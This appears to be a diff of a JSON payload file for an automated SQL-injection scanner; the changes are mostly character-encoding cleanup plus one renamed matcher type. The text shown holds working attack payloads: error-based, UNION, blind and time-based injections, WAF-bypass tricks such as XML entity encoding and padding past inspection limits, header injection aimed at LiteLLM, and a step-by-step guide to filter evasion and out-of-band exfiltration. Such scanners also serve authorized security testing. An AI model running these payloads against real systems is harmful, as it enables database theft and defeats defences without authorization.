@@ -28,7 +28,7 @@
       "probes": [
         {
           "payload": "{{baseline}} AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -",
-          "description": "MySQL EXTRACTVALUE error-based extraction \u2014 XPATH syntax error leaks version() output",
+          "description": "MySQL EXTRACTVALUE error-based extraction — XPATH syntax error leaks version() output",
           "matchers": [
             {
               "type": "word",
@@ -45,7 +45,7 @@
         },
         {
           "payload": "{{baseline}} AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)-- -",
-          "description": "MySQL UPDATEXML error-based extraction \u2014 XPATH syntax error leaks current DB user",
+          "description": "MySQL UPDATEXML error-based extraction — XPATH syntax error leaks current DB user",
           "matchers": [
             {
               "type": "word",
@@ -79,7 +79,7 @@
         },
         {
           "payload": "{{baseline}}'",
-          "description": "Single-quote error trigger \u2014 DB error strings with Adminer negative-match to suppress the admin-tool FP",
+          "description": "Single-quote error trigger — DB error strings with Adminer negative-match to suppress the admin-tool FP",
           "matchers": [
             {
               "type": "word",
@@ -115,7 +115,7 @@
       ]
     },
     "union_detect": {
-      "description": "UNION-based column count enumeration \u2014 determines number of columns by incrementing NULLs until query succeeds",
+      "description": "UNION-based column count enumeration — determines number of columns by incrementing NULLs until query succeeds",
       "tech_match": [],
       "param_match": [
         "id",
@@ -133,7 +133,7 @@
       "probes": [
         {
           "payload": "{{baseline}} UNION SELECT NULL-- -",
-          "description": "Single-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "description": "Single-column UNION probe — status 200 or length diff indicates correct column count",
           "matchers": [
             {
               "type": "status",
@@ -152,7 +152,7 @@
         },
         {
           "payload": "{{baseline}} UNION SELECT NULL,NULL-- -",
-          "description": "Two-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "description": "Two-column UNION probe — status 200 or length diff indicates correct column count",
           "matchers": [
             {
               "type": "status",
@@ -171,7 +171,7 @@
         },
         {
           "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL-- -",
-          "description": "Three-column UNION probe \u2014 status 200 or length diff indicates correct column count",
+          "description": "Three-column UNION probe — status 200 or length diff indicates correct column count",
           "matchers": [
             {
               "type": "status",
@@ -190,7 +190,7 @@
         },
         {
           "payload": "{{baseline}} ORDER BY 10-- -",
-          "description": "ORDER BY out-of-range column \u2014 500 error confirms fewer than 10 columns, revealing max column count",
+          "description": "ORDER BY out-of-range column — 500 error confirms fewer than 10 columns, revealing max column count",
           "matchers": [
             {
               "type": "status",
@@ -224,7 +224,7 @@
       "probes": [
         {
           "payload": "{{baseline}}'",
-          "description": "Quote break to trigger generic SQL error \u2014 500 alone is weak; combined with SQL-related error keywords for higher confidence",
+          "description": "Quote break to trigger generic SQL error — 500 alone is weak; combined with SQL-related error keywords for higher confidence",
           "matchers": [
             {
               "type": "status",
@@ -276,7 +276,7 @@
       ]
     },
     "waf_bypass": {
-      "description": "WAF bypass SQL injection payloads \u2014 MySQL version comments, URL-encoded keywords from HackTricks, and XML numeric-character-reference encoding for XML-body-borne injection points",
+      "description": "WAF bypass SQL injection payloads — MySQL version comments, URL-encoded keywords from HackTricks, and XML numeric-character-reference encoding for XML-body-borne injection points",
       "tech_match": [
         "MySQL",
         "Apache",
@@ -298,7 +298,7 @@
       "probes": [
         {
           "payload": "{{baseline}}/*!50000UNION*//*!50000SELECT*/NULL-- -",
-          "description": "MySQL conditional version comment bypass \u2014 inline comments hide UNION/SELECT from WAF keyword matching",
+          "description": "MySQL conditional version comment bypass — inline comments hide UNION/SELECT from WAF keyword matching",
           "matchers": [
             {
               "type": "status",
@@ -336,7 +336,7 @@
         },
         {
           "payload": "{{baseline}}'/**/UNION/**/SELECT/**/NULL-- -",
-          "description": "Comment-padded UNION SELECT \u2014 C-style comments break keyword detection in many WAF implementations",
+          "description": "Comment-padded UNION SELECT — C-style comments break keyword detection in many WAF implementations",
           "matchers": [
             {
               "type": "status",
@@ -355,7 +355,7 @@
         },
         {
           "payload": "{{baseline}} AND SLEEP(5)-- -   # prepend junk>=WAF-limit before this",
-          "description": "WAF body-inspection-limit bypass: prepend junk data larger than the WAF's inspected window so the injection sits beyond it while the backend still parses the full body. Documented limits \u2014 Cloudflare 128KB, AWS 8-64KB, Akamai 8-128KB, Azure 128KB, Barracuda 64KB, GCP Armor 8KB. Send as a large POST/JSON body with a junk field first, the injectable param last; time-based oracle confirms.",
+          "description": "WAF body-inspection-limit bypass: prepend junk data larger than the WAF's inspected window so the injection sits beyond it while the backend still parses the full body. Documented limits — Cloudflare 128KB, AWS 8-64KB, Akamai 8-128KB, Azure 128KB, Barracuda 64KB, GCP Armor 8KB. Send as a large POST/JSON body with a junk field first, the injectable param last; time-based oracle confirms.",
           "matchers": [
             {
               "type": "timing",
@@ -367,7 +367,7 @@
         },
         {
           "payload": "{{baseline}} &#65;&#78;&#68; &#69;&#88;&#84;&#82;&#65;&#67;&#84;&#86;&#65;&#76;&#85;&#69;(1,&#67;&#79;&#78;&#67;&#65;&#84;(0x7e,(&#83;&#69;&#76;&#69;&#67;&#84; version())))-- -",
-          "description": "XML decimal-entity WAF bypass: the injected value sits inside an XML request body (delivery vector \u2014 see xml_injection.json contexts) so the WAF inspects the raw bytes and never sees the keywords AND / EXTRACTVALUE / CONCAT / SELECT \u2014 each is written as decimal numeric character references (&#65;&#78;&#68; = AND, &#83;&#69;&#76;&#69;&#67;&#84; = SELECT). The XML parser decodes the entities before the value reaches the DB, so the EXTRACTVALUE XPATH error still leaks version(). Requires an XML-body-borne injection point.",
+          "description": "XML decimal-entity WAF bypass: the injected value sits inside an XML request body (delivery vector — see xml_injection.json contexts) so the WAF inspects the raw bytes and never sees the keywords AND / EXTRACTVALUE / CONCAT / SELECT — each is written as decimal numeric character references (&#65;&#78;&#68; = AND, &#83;&#69;&#76;&#69;&#67;&#84; = SELECT). The XML parser decodes the entities before the value reaches the DB, so the EXTRACTVALUE XPATH error still leaks version(). Requires an XML-body-borne injection point.",
           "matchers": [
             {
               "type": "word",
@@ -384,7 +384,7 @@
         },
         {
           "payload": "{{baseline}} &#x41;&#x4e;&#x44; &#x53;&#x4c;&#x45;&#x45;&#x50;(5)-- -",
-          "description": "XML hex-entity WAF bypass, time-based oracle: AND SLEEP(5) with keywords written as hexadecimal numeric character references (&#x41;&#x4e;&#x44; = AND, &#x53;&#x4c;&#x45;&#x45;&#x50; = SLEEP). Same mechanism as the decimal form \u2014 WAF byte-matching misses the encoded keywords, the XML parser decodes them before the DB parses the query. Requires an XML-body-borne injection point (xml_injection.json is the delivery vector); confirmed by the >=5s response delay.",
+          "description": "XML hex-entity WAF bypass, time-based oracle: AND SLEEP(5) with keywords written as hexadecimal numeric character references (&#x41;&#x4e;&#x44; = AND, &#x53;&#x4c;&#x45;&#x45;&#x50; = SLEEP). Same mechanism as the decimal form — WAF byte-matching misses the encoded keywords, the XML parser decodes them before the DB parses the query. Requires an XML-body-borne injection point (xml_injection.json is the delivery vector); confirmed by the >=5s response delay.",
           "matchers": [
             {
               "type": "timing",
@@ -417,7 +417,7 @@
       ]
     },
     "order_by_sink": {
-      "description": "Blind extraction via the ORDER BY / GROUP BY clause as the injection SINK (not column-count enumeration). Applies when the input lands directly inside ORDER BY so quote-breaking and UNION are unavailable \u2014 you cannot escape the clause, but you can substitute an expression that branches on a condition. Oracle forms: boolean-blind via a CASE that divides by zero on one branch (visible error only when the branch is taken), error-based CAST of a subselect to int, and time-based PG_SLEEP / SLEEP.",
+      "description": "Blind extraction via the ORDER BY / GROUP BY clause as the injection SINK (not column-count enumeration). Applies when the input lands directly inside ORDER BY so quote-breaking and UNION are unavailable — you cannot escape the clause, but you can substitute an expression that branches on a condition. Oracle forms: boolean-blind via a CASE that divides by zero on one branch (visible error only when the branch is taken), error-based CAST of a subselect to int, and time-based PG_SLEEP / SLEEP.",
       "tech_match": [
         "PostgreSQL",
         "MySQL",
@@ -439,7 +439,7 @@
       "probes": [
         {
           "payload": "{{baseline}},(SELECT CASE WHEN (1=2) THEN 1 ELSE 1/(SELECT 0) END)",
-          "description": "ORDER BY boolean-blind oracle via division-by-zero: the CASE expression evaluates 1/(SELECT 0) whenever the condition is FALSE, forcing a divide-by-zero DB error. Swap 1=2 for the real condition (e.g. (SELECT SUBSTRING(version(),1,1))='1') \u2014 an error means the ELSE branch ran (condition false), a clean sort means the THEN branch ran (condition true). Confirms the ORDER BY sink is injectable when UNION/quote-break are impossible.",
+          "description": "ORDER BY boolean-blind oracle via division-by-zero: the CASE expression evaluates 1/(SELECT 0) whenever the condition is FALSE, forcing a divide-by-zero DB error. Swap 1=2 for the real condition (e.g. (SELECT SUBSTRING(version(),1,1))='1') — an error means the ELSE branch ran (condition false), a clean sort means the THEN branch ran (condition true). Confirms the ORDER BY sink is injectable when UNION/quote-break are impossible.",
           "matchers": [
             {
               "type": "word",
@@ -499,7 +499,7 @@
       "probes": [
         {
           "payload": "Bearer AAAAAA'or'1'='1",
-          "description": "Authorization: Bearer with single-quote escape \u2014 confirms via error reflection",
+          "description": "Authorization: Bearer with single-quote escape — confirms via error reflection",
           "matchers": [
             {
               "type": "regex",
@@ -525,7 +525,7 @@
       ]
     },
     "litellm_pre_auth_header_injection_2026": {
-      "description": "LiteLLM pre-auth SQLi via Authorization header (CVE-2026-42208 class) \u2014 Bearer token interpolated into unparameterised SELECT for API-key lookup. Detect via PostgreSQL error marker or OR-injection echo.",
+      "description": "LiteLLM pre-auth SQLi via Authorization header (CVE-2026-42208 class) — Bearer token interpolated into unparameterised SELECT for API-key lookup. Detect via PostgreSQL error marker or OR-injection echo.",
       "tech_match": [
         "LiteLLM"
       ],
@@ -533,7 +533,7 @@
       "probes": [
         {
           "payload": "Bearer ' OR (SELECT 1)=1--",
-          "description": "Authorization header SQLi \u2014 boolean-OR with parenthesised subselect to bypass simple filters",
+          "description": "Authorization header SQLi — boolean-OR with parenthesised subselect to bypass simple filters",
           "matchers": [
             {
               "type": "regex",
@@ -556,7 +556,7 @@
       ]
     },
     "cte_bypass": {
-      "description": "CTE (Common Table Expression) SQLi \u2014 WITH clause bypasses WAFs that block UNION SELECT. MySQL 8+, PostgreSQL, MSSQL, SQLite 3.8.3+, Oracle.",
+      "description": "CTE (Common Table Expression) SQLi — WITH clause bypasses WAFs that block UNION SELECT. MySQL 8+, PostgreSQL, MSSQL, SQLite 3.8.3+, Oracle.",
       "tech_match": [
         "MySQL",
         "PostgreSQL",
@@ -567,7 +567,7 @@
       "probes": [
         {
           "payload": "') UNION SELECT * FROM (WITH t AS (SELECT 1) SELECT * FROM t)x--",
-          "description": "CTE-wrapped UNION bypass \u2014 WAFs that block 'UNION SELECT' may miss 'WITH...AS...SELECT'",
+          "description": "CTE-wrapped UNION bypass — WAFs that block 'UNION SELECT' may miss 'WITH...AS...SELECT'",
           "matchers": [
             {
               "type": "word",
@@ -581,7 +581,7 @@
         },
         {
           "payload": "';WITH t AS (SELECT @@version v) SELECT v FROM t--",
-          "description": "CTE stacked query \u2014 extract database version via CTE (MSSQL/MySQL 8+)",
+          "description": "CTE stacked query — extract database version via CTE (MSSQL/MySQL 8+)",
           "matchers": [
             {
               "type": "regex",
@@ -591,7 +591,7 @@
         },
         {
           "payload": "' UNION WITH t AS (SELECT version()) SELECT * FROM t--",
-          "description": "CTE UNION PostgreSQL \u2014 version extraction via WITH clause",
+          "description": "CTE UNION PostgreSQL — version extraction via WITH clause",
           "matchers": [
             {
               "type": "word",
@@ -604,10 +604,10 @@
         },
         {
           "payload": "';WITH RECURSIVE t(n) AS (VALUES(1) UNION ALL SELECT n+1 FROM t WHERE n<5) SELECT n FROM t--",
-          "description": "Recursive CTE \u2014 generates data without table access, useful for boolean/timing extraction",
+          "description": "Recursive CTE — generates data without table access, useful for boolean/timing extraction",
           "matchers": [
             {
-              "type": "status_not",
+              "type": "not_status",
               "value": [
                 200
               ]
@@ -617,7 +617,7 @@
       ]
     },
     "smuggling_waf_bypass": {
-      "description": "Use CL.TE request smuggling to bypass WAF payload inspection \u2014 the WAF reads Content-Length, the backend reads Transfer-Encoding",
+      "description": "Use CL.TE request smuggling to bypass WAF payload inspection — the WAF reads Content-Length, the backend reads Transfer-Encoding",
       "probes": [
         {
           "payload": "{{baseline}}",
@@ -638,14 +638,14 @@
   },
   "craft_guidance": [
     "1. IDENTIFY CONTEXT: Determine if input lands in WHERE clause, ORDER BY, INSERT VALUES, or LIMIT. Each needs different break characters.",
-    "2. DETECT DB ENGINE: Use vendor-specific errors or functions \u2014 @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
+    "2. DETECT DB ENGINE: Use vendor-specific errors or functions — @@version (MSSQL), version() (MySQL/PG), sqlite_version() (SQLite), banner (Oracle).",
     "3. CHOOSE TECHNIQUE by visibility: Error-based (fastest) > UNION (data extraction) > Boolean blind (slow but reliable) > Time-based (last resort) > OOB DNS (when no output at all).",
     "4. UNION EXPLOITATION: Find column count with ORDER BY N (increment until error), then UNION SELECT NULL,NULL,...,NULL to match. Replace NULLs one-by-one with data extraction functions.",
     "5. BLIND EXTRACTION: Use SUBSTRING(value,pos,1) with binary search on ASCII values. For time-based, calibrate delay against baseline latency (+2s minimum delta).",
-    "6. WAF BYPASS CHAIN: Try in order \u2014 inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
+    "6. WAF BYPASS CHAIN: Try in order — inline comments (/*!50000 SELECT*/), case variation (sElEcT), whitespace alternatives (/**/ or %0a), double encoding (%2527), concat char-by-char (CHAR(83)+CHAR(69)...).",
     "7. FILTER EVASION: If quotes blocked, use hex (0x61646D696E), CHAR(), or numeric comparison. If spaces blocked, use /**/ or %09 (tab). If keywords blocked, use synonyms (COALESCE vs IF, CASE vs IIF).",
     "8. OOB EXFILTRATION: MySQL LOAD_FILE+INTO OUTFILE, MSSQL xp_dirtree/xp_fileexist to UNC path, PostgreSQL COPY TO PROGRAM, Oracle UTL_HTTP.REQUEST.",
-    "9. XML-ENTITY WAF BYPASS: when the injection point is inside an XML request body (delivery vector: xml_injection.json contexts), encode SQL keywords as decimal (&#83;&#69;&#76;&#69;&#67;&#84; = SELECT) or hex (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;) numeric character references. A WAF inspecting raw bytes never sees the keyword; the XML parser decodes the entities before the value reaches the DB. Encode only the keywords (SELECT/UNION/AND/OR/SLEEP/quote) \u2014 the rest can stay literal.",
-    "10. ORDER BY SINK: when input lands directly in ORDER BY you cannot quote-break or UNION. Substitute a branching expression instead \u2014 CASE WHEN (cond) THEN 1 ELSE 1/(SELECT 0) END (boolean-blind via divide-by-zero error), CAST((SELECT ...) AS int) (error-based), or (SELECT 1 FROM PG_SLEEP(5)) (time-based). See the order_by_sink context."
+    "9. XML-ENTITY WAF BYPASS: when the injection point is inside an XML request body (delivery vector: xml_injection.json contexts), encode SQL keywords as decimal (&#83;&#69;&#76;&#69;&#67;&#84; = SELECT) or hex (&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;) numeric character references. A WAF inspecting raw bytes never sees the keyword; the XML parser decodes the entities before the value reaches the DB. Encode only the keywords (SELECT/UNION/AND/OR/SLEEP/quote) — the rest can stay literal.",
+    "10. ORDER BY SINK: when input lands directly in ORDER BY you cannot quote-break or UNION. Substitute a branching expression instead — CASE WHEN (cond) THEN 1 ELSE 1/(SELECT 0) END (boolean-blind via divide-by-zero error), CAST((SELECT ...) AS int) (error-based), or (SELECT 1 FROM PG_SLEEP(5)) (time-based). See the order_by_sink context."
   ]
 }
